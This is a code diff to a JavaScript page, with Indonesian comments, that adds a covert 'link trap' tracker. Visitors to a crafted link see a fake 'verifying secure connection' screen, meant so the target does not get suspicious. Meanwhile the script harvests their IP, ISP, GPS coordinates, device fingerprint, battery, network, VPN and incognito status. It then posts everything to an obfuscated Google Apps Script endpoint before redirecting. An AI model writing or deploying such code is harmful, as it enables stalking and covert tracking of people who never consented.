@@ -5,28 +5,10 @@ document.addEventListener('DOMContentLoaded', function () {
     const geoResult = document.getElementById('geo-result');
     const geoData = document.getElementById('geo-data');
     const logsBody = document.getElementById('logs-body');
-    const cloudApiInput = document.getElementById('cloud-api-url');
-    const btnSaveSettings = document.getElementById('btn-save-settings');
     const btnGeolocation = document.getElementById('btn-geolocation');
 
-    // Secret Settings Unlock Logic
-    let iconClicks = 0;
-    const secretTrigger = document.getElementById('secret-trigger');
-    const settingsNavItem = document.getElementById('settings-nav-item');
-
-    secretTrigger.addEventListener('click', () => {
-        iconClicks++;
-        if (iconClicks === 5) {
-            settingsNavItem.style.display = 'block';
-            // Auto switch to settings tab
-            const settingsTabTrigger = new bootstrap.Tab(document.getElementById('settings-tab'));
-            settingsTabTrigger.show();
-            console.log("Core Settings Unlocked.");
-        }
-    });
-
     // Default "Patent" URL (Base64 encoded)
-    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6cVJTX0dsN3cwWFBHeGgyLWVraGtwQndHY01ISWt0Z1lVd19wSGFqU0FTbjY5Mk1IV0dGSUZlSl9GbW56enl0alEvZXhlYw==';
+    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6ZkZoM0ZvWFFVOWxkZF9rVV9RVFh1ODBvMTFiVlNxNDhpVF9mMXBEZWdway9UWS9yQWd3eVp1eVp0V0diMnI5d3ZVUS9leGVj';
     
     /**
      * Mendapatkan URL API yang aktif. 
@@ -34,20 +16,85 @@ document.addEventListener('DOMContentLoaded', function () {
      */
     const getCUrl = () => localStorage.getItem('spy_cloud_url') || atob(_0x4f2a);
 
-    // Inisialisasi input URL di tab settings saat halaman dimuat
-    if (cloudApiInput) {
-        cloudApiInput.value = getCUrl();
-    }
+    /**
+     * Mengambil jejak digital perangkat (Device Fingerprinting).
+     */
+    const getDeviceInfo = () => {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const lang = navigator.language;
+        
+        let os = "Unknown OS";
+        if (/Windows/i.test(ua)) os = "Windows";
+        else if (/Android/i.test(ua)) os = "Android";
+        else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+        else if (/Mac/i.test(ua)) os = "MacOS";
+        else if (/Linux/i.test(ua)) os = "Linux";
 
-    btnSaveSettings.addEventListener('click', () => {
-        const url = cloudApiInput.value.trim();
-        if (url.startsWith('https://script.google.com/')) {
-            localStorage.setItem('spy_cloud_url', url);
-            alert('Konfigurasi Cloud API berhasil disimpan!');
-        } else {
-            alert('Error: URL harus valid Google Apps Script (berakhir dengan /exec)');
+        let browser = "Unknown Browser";
+        if (/Edg/i.test(ua)) browser = "Edge";
+        else if (/Chrome/i.test(ua)) browser = "Chrome";
+        else if (/Firefox/i.test(ua)) browser = "Firefox";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+
+        return { os, browser, screen, lang, platform, ua };
+    };
+
+    /**
+     * Mengambil status baterai perangkat.
+     */
+    const getBatteryInfo = async () => {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'Charging' : 'Discharging'
+                };
+            } catch (e) { return { level: 'N/A', charging: 'N/A' }; }
         }
-    });
+        return { level: 'Not Supported', charging: 'Not Supported' };
+    };
+
+    /**
+     * Mendeteksi apakah user menggunakan mode Incognito/Private.
+     */
+    const getIncognitoStatus = async () => {
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const { quota } = await navigator.storage.estimate();
+                if (quota < 120000000) return 'YES'; // Limit kuota biasanya sangat rendah di mode Private
+            }
+        } catch (e) {}
+        return 'NO';
+    };
+
+    /**
+     * Mengambil informasi jaringan (WiFi/Seluler).
+     */
+    const getNetworkInfo = () => {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            return {
+                type: conn.type || 'unknown', // wifi, cellular, etc.
+                speed: conn.effectiveType || 'unknown' // 4g, 3g, etc.
+            };
+        }
+        return { type: 'Not Supported', speed: 'N/A' };
+    };
+
+    /**
+     * Memberikan notifikasi suara menggunakan Web Speech API.
+     */
+    const speak = (text) => {
+        if ('speechSynthesis' in window) {
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.lang = 'en-US';
+            utterance.rate = 0.9; // Sedikit lebih lambat agar terdengar dramatis
+            window.speechSynthesis.speak(utterance);
+        }
+    };
 
     function showLoading(show) {
         if (show) loading.classList.remove('d-none');
@@ -70,11 +117,17 @@ document.addEventListener('DOMContentLoaded', function () {
     async function fetchIpIntel(ip = '') {
         const query = ip ? `/${ip}` : '';
         try {
-            const res = await fetch(`https://ipapi.co${query}/json/`);
+            // Menggunakan ipwho.is untuk deteksi VPN/Proxy gratis
+            const res = await fetch(`https://ipwho.is${query}`);
             const data = await res.json();
-            if (!data.error) return {
-                ip: data.ip, isp: data.org, location: `${data.city}, ${data.country_name}`,
-                lat: data.latitude, lon: data.longitude, timezone: data.timezone
+            if (data.success) return {
+                ip: data.ip, 
+                isp: data.connection.isp, 
+                location: `${data.city}, ${data.country}`,
+                lat: data.latitude, 
+                lon: data.longitude, 
+                timezone: data.timezone.id,
+                proxy: (data.security.proxy || data.security.vpn || data.security.tor) ? 'YES' : 'NO'
             };
         } catch (e) {}
 
@@ -83,7 +136,8 @@ document.addEventListener('DOMContentLoaded', function () {
             const data = await res.json();
             return {
                 ip: data.ip, isp: data.organization, location: `${data.city}, ${data.country}`,
-                lat: data.latitude, lon: data.longitude, timezone: data.timezone
+                lat: data.latitude, lon: data.longitude, timezone: data.timezone,
+                proxy: 'Unknown'
             };
         } catch (e) {}
         throw new Error("Gagal menghubungi server intelijen.");
@@ -91,13 +145,37 @@ document.addEventListener('DOMContentLoaded', function () {
 
     async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
         const cloudUrl = getCUrl();
+        
+        // Ambil semua intelijen perangkat secara asinkron
+        const [device, battery, incognito] = await Promise.all([
+            getDeviceInfo(),
+            getBatteryInfo(),
+            getIncognitoStatus()
+        ]);
+        const network = getNetworkInfo();
+
+        // Payload sinkron 1:1 dengan rowData di Google Apps Script (Kolom B-T)
         const logEntry = {
+            type: type,
             ip: data.ip || 'Unknown',
             isp: data.isp || 'Unknown',
             location: data.location || 'Unknown',
             coords: `${data.lat || 0}, ${data.lon || 0}`,
+            timezone: data.timezone || 'N/A',
+            os: device.os || 'Unknown OS',
+            browser: device.browser || 'Unknown Browser',
+            resolution: device.screen || 'N/A',
+            language: device.lang || 'N/A',
+            platform: device.platform || 'N/A',
             target: targetUrl,
-            type: type
+            userAgent: navigator.userAgent,
+            batteryLevel: battery.level,
+            batteryStatus: battery.charging,
+            networkType: network.type,
+            networkSpeed: network.speed,
+            isProxy: data.proxy || 'NO',
+            isIncognito: incognito || 'NO',
+            device: `${device.os} (${device.browser}) | ${device.screen}`
         };
 
         if (!cloudUrl || !cloudUrl.includes('script.google.com')) {
@@ -110,49 +188,60 @@ document.addEventListener('DOMContentLoaded', function () {
         localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
         localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));
 
-        // Send to Cloud with Redirect Fix
         if (cloudUrl) {
             try {
-                // Gunakan mode 'no-cors' dan 'text/plain' untuk melewati hambatan CORS
-                // Ini mencegah browser mengirim 'OPTIONS' request yang tidak didukung Apps Script
+                // Gunakan mode no-cors untuk bypass kebijakan CORS Google Script
                 fetch(cloudUrl, {
                     method: 'POST',
                     mode: 'no-cors',
-                    redirect: 'follow', 
-                    cache: 'no-cache',
+                    keepalive: true,
                     headers: { 'Content-Type': 'text/plain' },
                     body: JSON.stringify(logEntry)
                 });
                 console.log("Tracking sync initiated.");
-                // Critical: Wait for transmission to finish before the browser kills the process on redirect
-                await new Promise(r => setTimeout(r, 1000));
+                speak("Target Acquired. Data synchronized to cloud.");
+                // Beri jeda singkat untuk memastikan buffer stream terkirim
+                await new Promise(r => setTimeout(r, 800));
             } catch (e) { console.error("Cloud Error", e); }
         }
     }
 
     async function loadLogs() {
         const cloudUrl = getCUrl();
-        logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Syncing...</td></tr>';
+        logsBody.innerHTML = '<tr><td colspan="6" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Menghubungkan ke Satelit...</td></tr>';
         try {
             const res = await fetch(cloudUrl);
             const data = await res.json();
             renderLogs(data);
         } catch (e) {
-            renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'));
+            renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'), true);
         }
     }
 
     function renderLogs(logs) {
         if (!logs || logs.length === 0) {
-            logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-5 text-muted opacity-50">Belum ada aktivitas.</td></tr>';
+            logsBody.innerHTML = '<tr><td colspan="6" class="text-center py-5 text-muted opacity-50">Belum ada aktivitas.</td></tr>';
             return;
         }
         logsBody.innerHTML = logs.map(log => {
             const isTrap = log.type === 'TRAP';
+            const isVpn = log.isProxy === 'YES';
+            const isInc = log.isIncognito === 'YES';
+            const deviceDisplay = log.device || (log.os ? `${log.os} (${log.browser})` : 'N/A');
             return `
                 <tr class="animate__animated animate__fadeIn">
                     <td><div class="text-primary small fw-bold">${log.timestamp || 'Just Now'}</div><span class="badge ${isTrap ? 'bg-danger' : 'bg-primary'} extra-small" style="font-size:0.6rem">${isTrap ? 'LINK TRAP' : 'LIVE TRACK'}</span></td>
-                    <td><div class="font-monospace text-info fw-bold">${log.ip}</div><div class="text-muted extra-small"><i class="fas fa-network-wired me-1"></i>${log.isp || 'Unknown Provider'}</div></td>
+                    <td>
+                        <div class="font-monospace text-info fw-bold">${log.ip} ${isVpn ? '<i class="fas fa-user-mask text-danger ms-1" title="VPN DETECTED"></i>' : ''}</div>
+                        <div class="text-muted extra-small"><i class="fas fa-network-wired me-1"></i>${log.isp || 'Unknown Provider'}</div>
+                    </td>
+                    <td>
+                        ${isVpn ? '<span class="badge bg-danger extra-small d-block mb-1">VPN</span>' : '<span class="badge bg-success opacity-50 extra-small d-block mb-1">CLEAN</span>'}
+                        ${isInc ? '<span class="badge bg-warning text-dark extra-small d-block">PRIVATE</span>' : ''}
+                    </td>
+                    <td>
+                        <div class="text-warning extra-small font-monospace"><i class="fas fa-microchip me-1"></i>${deviceDisplay}</div>
+                    </td>
                     <td><span class="small text-white">${log.location}</span></td>
                     <td><a href="https://www.google.com/maps?q=${log.coords}" target="_blank" class="btn btn-xs btn-outline-primary"><i class="fas fa-map-marker-alt"></i></a></td>
                 </tr>`;
@@ -164,17 +253,37 @@ document.addEventListener('DOMContentLoaded', function () {
         resultArea.innerHTML = '';
         try {
             const data = await fetchIpIntel(targetIp);
+            
             showLoading(false);
+            const d = getDeviceInfo();
+            const b = await getBatteryInfo();
+            const i = await getIncognitoStatus();
+            const n = getNetworkInfo();
+            const proxyIcon = data.proxy === 'YES' ? '<i class="fas fa-user-mask text-danger"></i>' : '<i class="fas fa-check-circle text-success"></i>';
+
             resultArea.innerHTML = `
-                <div class="result-card border-primary border-opacity-25 animate__animated animate__fadeInUp">
+                <div class="result-card border-primary border-opacity-25 scanning-container animate__animated animate__fadeInUp">
+                    <div class="scanning-line"></div>
                     <h5 class="fw-bold text-primary mb-3"><i class="fas fa-fingerprint me-2"></i>Intel: <span class="font-monospace">${data.ip}</span></h5>
-                    <div class="mb-2">
+                    <div class="mb-1">
                         <div class="data-label">Lokasi Terdeteksi</div>
-                        <div class="text-white small">${data.location}</div>
+                        <div class="scanning-text small">${data.location}</div>
                     </div>
                     <div class="mb-3">
                         <div class="data-label">Provider (ISP)</div>
-                        <div class="text-white small font-monospace">${data.isp}</div>
+                        <div class="scanning-text small font-monospace">${data.isp}</div>
+                    </div>
+                    <div class="mb-3">
+                        <div class="data-label">VPN/Proxy Detection</div>
+                        <div class="text-white small">${proxyIcon} ${data.proxy === 'YES' ? 'Detected (High Risk)' : 'Clean (Low Risk)'}</div>
+                    </div>
+                    <div class="mb-3">
+                        <div class="data-label">Private Browsing</div>
+                        <div class="text-white small">${i === 'YES' ? '<i class="fas fa-eye-slash text-warning me-2"></i>Incognito Mode Detected' : '<i class="fas fa-eye text-success me-2"></i>Normal Mode'}</div>
+                    </div>
+                    <div class="mb-3">
+                        <div class="data-label">Perangkat & OS</div>
+                        <div class="scanning-text small"><i class="fas fa-desktop me-2 text-info"></i>${d.os} (${d.browser}) | ${d.screen} | <i class="fas fa-battery-half me-1"></i>${b.level} | <i class="fas fa-network-wired me-1"></i>${n.type}</div>
                     </div>
                     <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-link w-100 text-center py-2">BUKA PETA</a>
                 </div>`;
@@ -194,42 +303,53 @@ document.addEventListener('DOMContentLoaded', function () {
 
         navigator.geolocation.getCurrentPosition(
             async (position) => {
-                const { latitude, longitude, accuracy } = position.coords;
-                showLoading(false);
-                geoResult.classList.remove('d-none');
-                
-                geoData.innerHTML = `
-                    <div class="row g-3">
-                        <div class="col-sm-6">
-                            <div class="data-label text-info">Garis Lintang (Lat)</div>
-                            <div class="text-white fw-bold font-monospace fs-5">${latitude}</div>
-                        </div>
-                        <div class="col-sm-6">
-                            <div class="data-label text-info">Garis Bujur (Lon)</div>
-                            <div class="text-white fw-bold font-monospace fs-5">${longitude}</div>
-                        </div>
-                        <div class="col-12">
-                            <div class="data-label text-info">Tingkat Akurasi</div>
-                            <div class="text-white small font-monospace"><i class="fas fa-bullseye me-1"></i>± ${accuracy.toFixed(2)} meter</div>
-                        </div>
-                        <div class="col-12 mt-3">
-                            <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="btn btn-outline-info w-100 py-2 fw-bold">
-                                <i class="fas fa-map-marked-alt me-2"></i>LIHAT POSISI DI PETA
-                            </a>
-                        </div>
-                    </div>`;
-                
                 try {
-                    const data = await fetchIpIntel('');
-                    await saveLog({ ...data, lat: latitude, lon: longitude, location: `GPS Precise (Acc: ${accuracy.toFixed(0)}m)` }, 'GPS');
+                    const { latitude, longitude, accuracy } = position.coords;
+                    
+                    // Mengumpulkan Intelijen IP & Perangkat secara paralel untuk efisiensi
+                    const [ipData, battery, incognito] = await Promise.all([
+                        fetchIpIntel('').catch(() => ({ ip: 'Unknown', isp: 'Unknown', location: 'Unknown', proxy: 'NO', timezone: 'N/A' })),
+                        getBatteryInfo(),
+                        getIncognitoStatus()
+                    ]);
+
+                    showLoading(false);
+                    const device = getDeviceInfo();
+                    const network = getNetworkInfo();
+
+                    // Gabungkan data GPS dengan data IP
+                    const combinedIntel = {
+                        ...ipData,
+                        lat: latitude,
+                        lon: longitude,
+                        location: `${ipData.location} (High Precision GPS ±${accuracy.toFixed(0)}m)`
+                    };
+
+                    // Tampilkan Hasil Lengkap di UI
+                    const proxyIcon = combinedIntel.proxy === 'YES' ? '<i class="fas fa-user-mask text-danger"></i>' : '<i class="fas fa-check-circle text-success"></i>';
+                    resultArea.innerHTML = `
+                        <div class="result-card border-info scanning-container animate__animated animate__fadeInUp">
+                            <div class="scanning-line"></div>
+                            <h5 class="fw-bold text-info mb-3"><i class="fas fa-satellite-dish me-2"></i>Intelijen GPS Gabungan: ${combinedIntel.ip}</h5>
+                            <div class="mb-2"><div class="data-label">Lokasi Presisi</div><div class="scanning-text small">${combinedIntel.location}</div></div>
+                            <div class="mb-2"><div class="data-label">Koordinat</div><div class="scanning-text small font-monospace">${latitude}, ${longitude}</div></div>
+                            <div class="mb-2"><div class="data-label">Provider (ISP)</div><div class="scanning-text small font-monospace">${combinedIntel.isp}</div></div>
+                            <div class="mb-2"><div class="data-label">Keamanan & Mode</div><div class="scanning-text small">${proxyIcon} VPN: ${combinedIntel.proxy} | <i class="fas fa-eye${incognito === 'YES' ? '-slash text-warning' : ' text-success'} ms-2"></i> Private: ${incognito}</div></div>
+                            <div class="mb-3"><div class="data-label">Perangkat & Daya</div><div class="scanning-text small">${device.os} (${device.browser}) | ${device.screen} | <i class="fas fa-battery-half me-1"></i>${battery.level} | <i class="fas fa-network-wired me-1"></i>${network.type}</div></div>
+                            <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="map-link w-100 text-center py-2">BUKA PETA STRATEGIS</a>
+                        </div>`;
+
+                    // Kirim semua data ke Spreadsheet
+                    await saveLog(combinedIntel, 'GPS');
                 } catch (e) {
-                    await saveLog({ ip: 'Local Device', isp: 'GPS Sensor', lat: latitude, lon: longitude, location: 'High Accuracy GPS' }, 'GPS');
+                    showLoading(false);
+                    alert("Gagal sinkronisasi intelijen: " + e.message);
                 }
             },
             (error) => {
                 showLoading(false);
-                const msgs = { 1: 'Izin GPS ditolak oleh pengguna.', 2: 'Posisi tidak ditemukan.', 3: 'Waktu permintaan habis.' };
-                alert(`Error: ${msgs[error.code] || error.message}`);
+                const msgs = { 1: 'Izin GPS ditolak.', 2: 'Posisi tidak ditemukan.', 3: 'Waktu permintaan habis.' };
+                alert(`Error Geolocation: ${msgs[error.code] || error.message}`);
             },
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
@@ -264,12 +384,48 @@ document.addEventListener('DOMContentLoaded', function () {
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.has('id') && urlParams.has('redir')) {
         const redirTarget = urlParams.get('redir');
-        fetchIpIntel('')
-            .then(async (data) => {
-                // Ensure cloud save completes before moving away
-                await saveLog(data, 'TRAP', redirTarget);
-                window.location.replace(redirTarget);
-            })
-            .catch(() => { window.location.replace(redirTarget); });
+        
+        // Sembunyikan UI utama dan tampilkan layar pemrosesan agar target tidak curiga
+        document.body.innerHTML = `
+            <div class="d-flex justify-content-center align-items-center vh-100 bg-dark text-white text-center">
+                <div>
+                    <div class="spinner-grow text-primary mb-3" style="width: 3rem; height: 3rem;"></div>
+                    <p class="fw-bold tracking-text">REDIRECTING TO SECURE TARGET...</p>
+                    <p class="text-muted small">Please wait while we verify your secure connection...</p>
+                </div>
+            </div>`;
+
+        const runTrap = async () => {
+            let trackerData = { ip: 'Unknown', isp: 'Unknown', location: 'Unknown', lat: 0, lon: 0, device: getDeviceInfo() };
+            
+            // 1. Tahap Pertama: Ambil data Intelijen IP (Cepat)
+            try {
+                trackerData = await fetchIpIntel('');
+            } catch (e) { console.error("Initial IP tracking failed"); }
+
+            // 2. Tahap Kedua: Ambil Koordinat GPS Realtime (Meminta Izin Browser)
+            if (navigator.geolocation) {
+                const getGPS = new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve(pos.coords),
+                        () => resolve(null), // Jika ditolak atau error, kembalikan null
+                        { enableHighAccuracy: true, timeout: 6000 }
+                    );
+                });
+
+                const coords = await getGPS;
+                if (coords) {
+                    trackerData.lat = coords.latitude;
+                    trackerData.lon = coords.longitude;
+                    trackerData.location = `${trackerData.location} (High Accuracy GPS)`;
+                }
+            }
+
+            // 3. Tahap Ketiga: Sinkronisasi Data ke Cloud & Redirect
+            await saveLog(trackerData, 'TRAP', redirTarget);
+            window.location.replace(redirTarget);
+        };
+
+        runTrap();
     }
 });
